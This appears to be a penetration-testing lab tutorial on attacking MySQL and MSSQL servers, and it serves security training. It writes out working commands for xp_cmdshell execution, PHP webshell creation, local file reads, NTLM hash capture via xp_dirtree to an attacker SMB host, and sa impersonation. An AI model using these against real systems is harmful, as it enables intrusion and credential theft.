[MySQL](https://www.mysql.com/) and [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) are [relational database](https://en.wikipedia.org/wiki/Relational_database) management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL & MySQL use the [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) for querying and maintaining the database.

Before we explore using SQL syntax, it is essential to know the default databases for `MySQL` and `MSSQL`.

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.       

## Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

|   |   |
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|

## Protocol Specific Attacks

It is crucial to understand how SQL syntax works.

#### Read/Change the Database

Let's imagine we gained access to a SQL Database. First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table.

### MySQL - Connecting to the SQL Server

	AstraX01@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

### Sqlcmd - Connecting to the SQL Server

	C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

	1>

**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output.

### Sqsh - Connecting to the MSSQL Server

If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:

	AstraX01@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

### Impacket-Mssqlclient -Connecting to the MSSQL Server

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

	AstraX01@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7

### Windows Authencation For Mssql 

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

**For Sqsh**:

	AstraX01@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

**For `impacket-mssqlclient`:**

	AstraX01@htb[/htb]$ impacket-mssqlclient julio@10.129.203.7 --windows-auth

#### SQL Syntax

#### Show Databases

	mysql> SHOW DATABASES;

If we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.

	1> SELECT name FROM master.dbo.sysdatabases 
	2> GO

	name 
	--------------------------------------------------
	master 
	tempdb 
	model 
	msdb 
	htbusers

#### Select a Database

`mysql:`

	mysql> USE htbusers;

	Database changed

`Mssql:`

	1> USE htbusers
	2> GO

#### Show Tables

`mysql:`

	mysql> SHOW TABLES; 
	
	+----------------------------+ 
	| Tables_in_htbusers         | 
	+----------------------------+ 
	| actions                    | 
	| permissions                | 
	| permissions_roles          | 
	| permissions_users          | 
	| roles                      | 
	| roles_users                | 
	| settings                   | 
	| users                      | 
	+----------------------------+ 
	8 rows in set (0.00 sec)

`Mssql:`

	1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
	2> GO

	table_name
	--------------------------------
	actions
	permissions
	permissions_roles
	permissions_users
	roles      
	roles_users
	settings
	users 
	(8 rows affected)

#### Select all Data from Table "users"

`mysql:`

	mysql> SELECT * FROM users; 
	
	+----+---------------+------------+---------------------+ 
	| id | username      | password   | date_of_joining     | 
	+----+---------------+------------+---------------------+ 
	| 1  | admin         | p@ssw0rd   | 2020-07-02 00:00:00 | 
	| 2  | administrator | adm1n_p@ss | 2020-07-02 11:30:50 | 
	| 3  | john          | john123!   | 2020-07-02 11:47:16 | 
	| 4  | tom           | tom123!    | 2020-07-02 12:23:16 | 
	+----+---------------+------------+---------------------+ 
	
	4 rows in set (0.00 sec)

`Mssql:`

	1> SELECT * FROM users 
	2> go 
	id          username             password         data_of_joining 
	----------- -------------------- ---------------- ----------------------- 
	1           admin                p@ssw0rd         2020-07-02 00:00:00.000 
	2           administrator        adm1n_p@ss       2020-07-02 11:30:50.000 
	3           john                 john123!         2020-07-02 11:47:16.000 
	4           tom                  tom123!          2020-07-02 12:23:16.000 
	
	(4 rows affected)

## Execute Commands

`Command execution` is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

#### XP_CMDSHELL

	1> xp_cmdshell 'whoami' 
	2> GO

	output 
	----------------------------- 
	no service\mssql$sqlexpress 
	NULL 
	(2 rows affected)

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

	-- To allow advanced options to be changed. 
	EXECUTE sp_configure 'show advanced options', 1 
	GO 
	-- To update the currently configured value for advanced options. 
	RECONFIGURE 
	GO 
	-- To enable the feature. 
	EXECUTE sp_configure 'xp_cmdshell', 1 
	GO 
	-- To update the currently configured value for this feature. 
	RECONFIGURE 
	GO

## Write Local Files

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands.

#### MySQL - Write Local File

	mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'; 
	
	Query OK, 1 row affected (0.001 sec)

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

#### MySQL - Secure File Privileges

	mysql> show variables like "secure_file_priv";

	+------------------+-------+ 
	| Variable_name    | Value | 
	+------------------+-------+ 
	| secure_file_priv |       | 
	+------------------+-------+ 
	
	1 row in set (0.005 sec)

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures

	1> sp_configure 'show advanced options', 1
	2> GO
	3> RECONFIGURE
	4> GO
	5> sp_configure 'Ole Automation Procedures', 1
	6> GO
	7> RECONFIGURE
	8> GO

#### MSSQL - Create a File

	1> DECLARE @OLE INT 
	2> DECLARE @FileID INT 
	3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT 
	4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1 
	5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>' 
	6> EXECUTE sp_OADestroy @FileID 
	7> EXECUTE sp_OADestroy @OLE 
	8> GO

## Read Local Files

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

#### Read Local Files in MSSQL

	1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents 
	2> GO

#### MySQL - Read Local Files in MySQL

	mysql> select LOAD_FILE("/etc/passwd");

## Capture MSSQL Service Hash

 We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

#### XP_DIRTREE Hash Stealing

	1> EXEC master..xp_dirtree '\\10.10.110.17\share\' 
	2> GO

#### XP_SUBDIRS Hash Stealing

	1> EXEC master..xp_subdirs '\\10.10.110.17\share\' 
	2> GO 
	HResult 0x55F6, Level 16, State 1 
	xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

#### XP_SUBDIRS Hash Stealing with Responder

	AstraX01@htb[/htb]$ sudo responder -I tun0

#### XP_SUBDIRS Hash Stealing with impacket

	AstraX01@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support


## Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:

#### Identify Users that We Can Impersonate

	> SELECT distinct b.name 
	> 2> FROM sys.server_permissions a 
	> 3> INNER JOIN sys.server_principals b 
	> 4> ON a.grantor_principal_id = b.principal_id 
	> 5> WHERE a.permission_name = 'IMPERSONATE' 
	> 6> GO 
	
	name 
	----------------------------------------------- 
	sa 
	ben 
	valentin 
	(3 rows affected)

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:

#### Verifying our Current User and Role

	1> SELECT SYSTEM_USER 
	2> SELECT IS_SRVROLEMEMBER('sysadmin') 
	3> go 
	
	----------- 
	julio 
	
	(1 rows affected) 
	
	----------- 
	           0 
	
	(1 rows affected)


As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user.

To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.

#### Impersonating the SA User

	1> EXECUTE AS LOGIN = 'sa' 
	2> SELECT SYSTEM_USER 
	3> SELECT IS_SRVROLEMEMBER('sysadmin') 
	4> GO 
	
	----------- 
	sa 
	
	(1 rows affected)
	
	----------- 
	          1 
	
	(1 rows affected)

**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database.

## Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.

#### Identify linked Servers in MSSQL

	1> SELECT srvname, isremote FROM sysservers 
	2> GO 
	
	srvname                             isremote 
	----------------------------------- -------- 
	DESKTOP-MFERMN4\SQLEXPRESS          1 
	10.0.0.12\SQLEXPRESS                0 
	
	(2 rows affected)

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server.

Next, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

	1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS] 
	2> GO 
	------------------------------ ------------------------------ ------------------------------ ----------- 
	DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019      (RTM sa_remote 1 
	
	(1 rows affected)

